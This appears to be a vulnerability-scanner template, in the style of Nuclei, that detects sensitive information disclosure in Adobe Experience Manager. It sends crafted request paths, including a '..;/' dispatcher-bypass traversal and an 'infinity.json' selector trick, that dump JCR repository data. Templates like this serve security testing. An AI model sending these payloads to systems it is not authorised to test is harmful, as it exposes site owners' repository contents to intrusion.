id: poc-aem-secrets-sensitive-information-disclosure
info:
  name: Adobe Experience Manager Sensitive Information Disclosure
  author: ProjectDiscoveryAI
  severity: high
  tags: information-disclosure,aem
http:
  - method: GET
    path:
      - "/content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json"
      - "/..;//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json"
    headers:
      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
      Accept-Language: "en-US,en;q=0.9,hi;q=0.8"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "jcr:uuid"
          - "jcr:createdBy"
          - "uri"
      - type: word
        part: header
        words:
          - "application/json"
